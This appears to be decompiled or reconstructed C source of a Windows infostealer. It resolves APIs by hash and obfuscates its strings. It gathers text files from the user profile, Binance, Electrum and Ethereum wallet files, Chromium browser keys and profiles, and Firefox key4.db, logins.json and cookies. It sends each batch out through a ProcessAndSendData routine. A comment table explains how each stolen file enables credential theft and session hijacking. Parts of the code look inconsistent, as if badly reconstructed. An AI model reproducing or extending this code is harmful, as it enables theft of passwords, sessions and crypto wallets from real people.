#include "../HEADER/HEADER.h"

void allocateMemory(int16_t flag, void** buffer)
{
    int32_t status = 1;
    int32_t actionFlag = flag;
    void* memoryBlock = allocateMemoryBlock();

    if (!memoryBlock)
        memoryBlock = nullptr;
    else
    {
        *(uint32_t*)((char*)memoryBlock + 0x50) = 6;

        if (!performMemoryCheck(memoryBlock))
        {
            _free(memoryBlock);
            memoryBlock = nullptr;
        }
    }

    int32_t someValue = 8;
    void** result = fetchResult();
    *(uint32_t*)buffer = memoryBlock;
    result[1] = actionFlag;
    *(uint32_t*)result = memoryBlock;
    int32_t resultValue = result[1];
    buffer[1] = resultValue;

    return resultValue;
}

int32_t performMemoryCheck(void* arg)
{
    void* tempArg = arg;
    int32_t result = 0;
    *(uint32_t*)((char*)arg + 0x3c) = SomeFuncCheck;
    *(uint32_t*)((char*)arg + 0x40) = 0;
    *(uint32_t*)((char*)arg + 0x44) = arg;

    if (isMemoryValid(arg))
    {
        *(uint32_t*)((char*)arg + 0x18) = 3;
        int32_t allocationResult = (*(uint32_t*)((char*)arg + 0x28))(*(uint32_t*)((char*)arg + 0x34), 1, 0x400);
        *(uint32_t*)(*(uint32_t*)((char*)arg + 0x48) + 0x48) = allocationResult;

        if (allocationResult)
        {
            result = 1;
            *(uint32_t*)(*(uint32_t*)((char*)arg + 0x48) + 0x50) = 0x400;
        }
        else
        {
            releaseMemory(arg, 0);
            *(uint32_t*)((char*)arg + 0x1c) = 0x10;
        }
    }

    return result;
}

int32_t fetchResult()
{
    return requestMemoryAllocation();
}

int32_t requestMemoryAllocation(uint32_t bytesToAllocate)
{
    uint32_t dwBytes = bytesToAllocate;

    if (dwBytes <= 0xffffffe0)
    {
        if (!dwBytes)
            dwBytes += 1;

        int32_t retryCount;
        do
        {
            int32_t result = HeapAlloc(data_428644, HEAP_NONE, dwBytes);

            if (result)
                return result;

            if (!retryMemoryAllocation())
                break;

            retryCount = handleMemoryRetry(dwBytes);
        } while (retryCount);
    }

    *(uint32_t*)__errno() = 0xc;
    return 0;
}

int32_t __fastcall processPath(PWSTR fileExtension,
                                int32_t searchPath,
                                PWSTR destinationFolder,
                                int32_t recursionDepth,
                                int32_t** SysInfo)
{
    int32_t* searchBuffer = malloc(260, 2);

    void* getFullPathFunc = ResolveHashes(0x7328f505, u"kernel32.dll");
    getFullPathFunc(searchPath, searchBuffer, searchBufferSize);

    int32_t* resultBuffer = malloc(1, 0x1000);

    int32_t* listBuffer = malloc(1, 0x1000);

    void* fileListPointer = nullptr;
    int32_t iterationCounter = 0;
    int32_t* fileList = listBuffer;

    searchFiles(&fileListPointer, fileExtension, searchPath, resultBuffer, &fileListPointer);

    void* tempFileList = fileListPointer;
    void* currentFile;

    if (fileListPointer) {
        do {
            PWSTR fileName = *(uint32_t*)resultBuffer;
            int32_t* fileDataPtr = &currentFile;
            void* tempBuffer = &resultBuffer[1];

            *(uint32_t*)fileDataPtr = *(uint32_t*)tempBuffer;
            *(uint32_t*)((char*)fileDataPtr + 4) = *(uint32_t*)((char*)tempBuffer + 4);

            int32_t fileSize;
            if (fileSize <= 0xa00000) {
                char* tempBuffer2 = nullptr;
                fileListPointer = nullptr;

                // Process the file
                processFile(&fileListPointer);

                PWSTR fullPathBuffer = Alloc();
                lstrcatW(fullPathBuffer, destinationFolder);
                lstrcatW(fullPathBuffer, L"\\");
                lstrcatW(fullPathBuffer, fileName);

                PSTR resutlStrBrwsrOfshit = convertWideToAnsi(fullPathBuffer);

                if (fileListPointer) {
                    processCollectedFile(
                        handleSystemData(*(uint32_t*)SysInfo, resutlStrBrwsrOfshit),
                        tempBuffer2, *(uint32_t*)SysInfo, fileListPointer
                    );
                    finalizeProcessing(*(uint32_t*)SysInfo);
                }
            }

            resultBuffer += 4;
            tempFileList--;
        } while (tempFileList);
    }

    if (recursionDepth > 0) {
        searchFiles(&iterationCounter, L"*", searchPath, listBuffer, &iterationCounter);

        int32_t subFolderCount = iterationCounter;
        bool hasSubFolders = subFolderCount > 0;

        while (hasSubFolders) {
            PWSTR subFolderName = *(uint32_t*)listBuffer;
            int32_t* subFolderData = &currentFile;
            void* tempSubBuffer = &listBuffer[1];

            *(uint32_t*)subFolderData = *(uint32_t*)tempSubBuffer;
            *(uint32_t*)((char*)subFolderData + 4) = *(uint32_t*)((char*)tempSubBuffer + 4);

            int32_t subFolderSize;
            if (subFolderSize) {
                PWSTR subFolderPath = Alloc();
                lstrcatW(subFolderPath, destinationFolder);
                lstrcatW(subFolderPath, L"\\");
                lstrcatW(subFolderPath, _wcsrchr(currentFile, L'\\') + 1);

                processPath(subFolderPath, recursionDepth - 1, SysInfo);
                _free(subFolderPath);
            }

            listBuffer += 4;
            subFolderCount--;
            hasSubFolders = subFolderCount > 0;
        }
    }

    _free(resultBuffer);
    return _free(listBuffer);
}

int __fastcall 
ExtractUserData(int brwsrPathOfshit, 
                const WCHAR *brwsrOfshit, 
                void ***SysInfo) 
{
    void (__stdcall *ResolverSuckerFunc)(int, const WCHAR *, int);
    WCHAR *resolvedPath = NULL;
    const WCHAR *filePath = NULL;
    int finalCheckResult = 0;
    unsigned int v8 = 0;
    WCHAR *resultStrBrwsrOfshit = NULL;
    char *processedFile = NULL;
    LPCWSTR rawFileData = NULL;
    unsigned int fileDataSize = 0;
    int extractedFilePath = 0;

    resolvedPath = (WCHAR *)calloc(260, 2);
    ResolverSuckerFunc = (void (__stdcall *)(int, const WCHAR *, int))ResolveTheHash(1932064005, (int)L"kernel32.dll");
    ResolverSuckerFunc(brwsrPathOfshit, resolvedPath, 260);

    WCHAR *TheRealOne_ = (WCHAR *)calloc(260, 2);
    WCHAR *TheRealOne = TheRealOne_;
    lstrcatW(TheRealOne_, resolvedPath);
    filePath = GetFilePath((wchar_t *)L"\\Locedx765al Staedx765te");
    lstrcatW(TheRealOne_, filePath);

    finalCheckResult = verifyFileStatus(TheRealOne_);
    if (!finalCheckResult) {
        free(resolvedPath);
        free(TheRealOne);
        return finalCheckResult;
    }

    DecryptKeyData(TheRealOne_, (int *)&rawFileData, (int *)&fileDataSize);

    resultStrBrwsrOfshit = (WCHAR *)calloc(0x104, 2);
    lstrcatW(resultStrBrwsrOfshit, brwsrOfshit);
    lstrcatW(resultStrBrwsrOfshit, L"/");
    lstrcatW(resultStrBrwsrOfshit, L"dp.txt");

    processedFile = ProccessingOrMapsTheWideCharacter(resultStrBrwsrOfshit);

    if (fileDataSize) {
        ProcessFilePathAndUpdateSession(*SysInfo, processedFile);
        blabla((int)*SysInfo, rawFileData, fileDataSize);
        blabla((char *)*SysInfo);
    }

    rawFileData = NULL;
    fileDataSize = 0;

    ExtractFileInfoViaNTDLL(TheRealOne, (unsigned int *)&rawFileData, &fileDataSize);

    char *processedFileData = StripUTF8BOMAndParse((const char *)rawFileData);
    _DWORD *lookupTableEntry = (_DWORD *)ValidateKeyStructure(processedFileData);
    _DWORD *parsedKeyResult = (_DWORD *)ExtractValueFromKeyPath(lookupTableEntry, "profile.info_cache");

    finalCheckResult = ValidateKeyStructure(parsedKeyResult);
    extractedFilePath = finalCheckResult;

    if (finalCheckResult && *(uint32_t *)(finalCheckResult + 24)) {
        do {
            const char *profilePathStr = *(const char **)(*(uint32_t *)(finalCheckResult + 12) + 4 * v8);
            rawFileData = (LPCWSTR)calloc(0x104, 2);
            mbstowcs((wchar_t *)rawFileData, profilePathStr, strlen(profilePathStr) + 1);

            WCHAR *formattedProfilePath = (WCHAR *)calloc(0x104, 2);
            lstrcatW(formattedProfilePath, resolvedPath);
            lstrcatW(formattedProfilePath, L"\\");
            lstrcatW(formattedProfilePath, rawFileData);

            int32_t *profileInfo = (int32_t *)malloc(12);
            *(uint32_t *)profileInfo = (uint32_t)brwsrOfshit;
            profileInfo[2] = (int32_t)rawFileData;
            profileInfo[1] = (int32_t)formattedProfilePath;

            CryptoWallrtsAnd2FA((int)profileInfo, (int)SysInfo);
            free(profileInfo);

            ++v8;
        } while (v8 < *(uint32_t *)(finalCheckResult + 24));
    }

    free(resolvedPath);
        free(TheRealOne);
            free(TheRealOne_);
            free(resultStrBrwsrOfshit);
        free(processedFile);
    free(rawFileData);

    return finalCheckResult;
}

void __fastcall 
ExtractFirefoxProfileData(int firefoxProfilePath, 
                          const WCHAR *browserName, 
                          DWORD *sysInfo)
{ /*---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    File Name               Location                                    Purpose                                            Exploitation Risk
    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    key4.db                 %APPDATA%\Mozilla\Firefox\Profiles\         Stores encryption keys for stored passwords        If stolen, attackers can decrypt stored credentials from logins.json
    logins.json             %APPDATA%\Mozilla\Firefox\Profiles\         Contains saved usernames & passwords               When combined with key4.db, all stored credentials can be recovered
    cookies.sqlite          %APPDATA%\Mozilla\Firefox\Profiles\         Stores session cookies from websites               Used for session hijacking, allowing attackers to bypass logins
    places.sqlite           %APPDATA%\Mozilla\Firefox\Profiles\         Stores browsing history & bookmarks                Attackers can track victim activity, steal sensitive URLs, and identify frequented sites
    formhistory.sqlite      %APPDATA%\Mozilla\Firefox\Profiles\         Stores autofill data (names, emails, addresses)    Can be used for identity theft and profiling victims
    cert9.db                %APPDATA%\Mozilla\Firefox\Profiles\         Stores security certificates & trust settings      Could be used for MITM attacks
    ----------------------------------------------------------------------------------------------------------
    File Stolen                   What Happens?
    ----------------------------------------------------------------------------------------------------------
    key4.db + logins.json         All saved passwords are decrypted & stolen
    cookies.sqlite                Attackers hijack active website sessions (bypass logins)
    places.sqlite                 They see full browsing history, including financial sites
    formhistory.sqlite            Can steal addresses, emails, and autofill data for phishing
    cert9.db                      Could be used for MITM attacks (fake SSL certs, phishing)
    ----------------------------------------------------------------------------------------------------------*/
    void *profileBuffer;
    void (__stdcall *GetFullPathFunction)(int, void *, int); 
    const WCHAR **profileEntries;
    WCHAR *fullFilePath;
    LPCWSTR *dataProcessingBuffer;
    const WCHAR *profileName;
    const WCHAR *profilePath;
    int profileCount;

    profileBuffer = calloc(0x104u, 2u);

    GetFullPathFunction(firefoxProfilePath, profileBuffer, 260);

    if (verifyFileStatus(profileBuffer))
    {
        profileCount = 0;
        profileEntries = (const WCHAR **)calloc(0x320u, 1u);

        checkFileExistence_0((int)profileBuffer, L"*", (int)profileEntries, &profileCount);

        for (; profileCount; --profileCount)
        {
            profileName = *profileEntries;
            profilePath = profileEntries[1];

            fullFilePath = (WCHAR *)calloc(0x104u, 2u);
            lstrcatW(fullFilePath, profilePath);
            lstrcatW(fullFilePath, L"\\key4.db");

            if (verifyFileStatus(fullFilePath))
            {
                dataProcessingBuffer = (LPCWSTR *)malloc(0xCu);
                *dataProcessingBuffer = browserName;
                dataProcessingBuffer[1] = profileName;
                dataProcessingBuffer[2] = profilePath;

                handleDataProcessing(dataProcessingBuffer, L"key4.db", sysInfo);          // password encryption key
                handleDataProcessing(dataProcessingBuffer, L"cert9.db", sysInfo);        // certificates
                handleDataProcessing(dataProcessingBuffer, L"formhistory.sqlite", sysInfo); // sutofill forms
                handleDataProcessing(dataProcessingBuffer, L"cookies.sqlite", sysInfo);  // stored cookies
                handleDataProcessing(dataProcessingBuffer, L"logins.json", sysInfo);     // saved passwords
                handleDataProcessing(dataProcessingBuffer, L"places.sqlite", sysInfo);   // browsing history

                free(dataProcessingBuffer);
            }

            profileEntries += 4;
        }
    }
}

int main(){
  const WCHAR *importedFilesPath;
  const WCHAR *binanceWalletPath;
  const WCHAR *electrumWalletPath;
  const WCHAR *walletEthereumPath;
  void SysInfo;

  allocateMem(1, &SysInfo);
  CollectSysInfo(&SysInfo);
    
  importedFilesPath = (const WCHAR *)GetFilePath((wchar_t *)L"Importedx765ant Fileedx765s/Proedx765file");
  PWSTR* extension = GetFilePath(u"*.edx765txt");
  PWSTR* userprofile = GetFilePath(u"%userproedx765file%");
  processPath(extension, userprofile, importedFilesPath, 2, &SysInfo);

  PWSTR walletPathBinance = GetFilePath(L"Walledx765ets/Binanedx765ce");
  PWSTR* extensionBinance = GetFilePath(L"apedx765p-stoedx765re.jsedx765on");
  PWSTR* appDataPathBinance = GetFilePath(L"%appdaedx765ta%/Binaedx765nce");
  processPath(extensionBinance, appDataPathBinance, walletPathBinance, 1, &SysInfo);

  PWSTR walletPathElectrum = GetFilePath(L"Walledx765ets/Eleedx765ctrum");
  PWSTR* extensionElectrum = GetFilePath(L"*edx765");
  PWSTR* appDataPathElectrum = GetFilePath(L"%appdedx765ata%/Eledx765ectrum");
  processPath(extensionElectrum, appDataPathElectrum, walletPathElectrum, 1, &SysInfo);

  PWSTR walletPathEthereum = GetFilePath(L"Walledx765ets/Ethedx765ereum");
  PWSTR* extensionEthereum = GetFilePath(L"keystedx765ore");
  PWSTR* appDataPathEthereum = GetFilePath(L"%appdedx765ata%/Etheedx765reum");
  processPath(extensionEthereum, appDataPathEthereum, walletPathEthereum, 1, &SysInfo);

  /*
  Binance - Electrum - Ethereum
  */
  
  ProcessAndSendData(&SysInfo); // wininet.dll shities 
  
  allocateMem(2, &SysInfo);
  struct {
      PWSTR brwsrOfshit;
      PWSTR brwsrPathOfshit;
  } ExfilTargets[] = {
    /*
    Chrome - Chromium - Edge - Kometa - Vivaldi
    Brave - Opera Stable - Opera GX Stable - Opera Neon
    */
      {GetFilePath(L"Chredx765ome"), GetFilePath(L"%loedx765calappedx765data%\\Goedx765ogle\\Chredx765ome\\Usedx765er Datedx765a")},
      {GetFilePath(L"Chromiedx765um"), GetFilePath(L"%localappdata%\\Chroedx765mium\\Useedx765r Data")},
      {GetFilePath(L"Ededx765ge"), GetFilePath(L"%localaedx765ppdata%\\Micedx765rosoft\\Edge\\Usedx765er Data")},
      {GetFilePath(L"Komedx765eta"), GetFilePath(L"%locedx765alappdaedx765ta%\\Komedx765eta\\Usedx765er Daedx765ta")},
      {GetFilePath(L"Vivaedx765ldi"), GetFilePath(L"%localedx765appdata%\\Viedx765valdi\\Usedx765er Data")},
      {GetFilePath(L"Braedx765ve"), GetFilePath(L"%localapedx765pdata%\\Braedx765veSofedx765tware\\Brex765ave-Broedx765wser\\Usedx765er Data")},
      {GetFilePath(L"Opedx765era Staedx765ble"), GetFilePath(L"%appdedx765ata%\\Opeedx765ra Softedx765ware\\Opedx765era Staedx765ble")},
      {GetFilePath(L"Opedx765era Gedx765X Stabedx765le"), GetFilePath(L"%appdedx765ata%\\Opedx765era Softwedx765are\\Opedx765era GX Staedx765ble")},
      {GetFilePath(L"Opedx765era Neoedx765n"), GetFilePath(L"%appdaedx765ta%\\Opedx765era Softwaedx765re\\Opedx765era Neoedx765n\\Usedx765er Daedx765ta")}
  };

  int sizer = sizeof(ExfilTargets) / sizeof(ExfilTargets[0]);
  
  for (int i = 0; i < sizer; i++) {
      ExtractUserData(ExfilTargets[i].brwsrOfshit, ExfilTargets[i].brwsrPathOfshit, &SysInfo);    
  }
    
  ProcessAndSendData(&SysInfo);
  allocateMem(3, &SysInfo);

  v30 = GetFilePath(L"Moziedx765lla Firefedx765ox");
  v31 = GetFilePath(L"%appdaedx765ta%\\Moedx765zilla\\Firedx765efox\\Profedx765iles");
  ExtractFirefoxProfileData((int)v31, (int)v30, (int)SysInfo);
  ProcessAndSendData((size_t **)SysInfo);
  return 0;
}
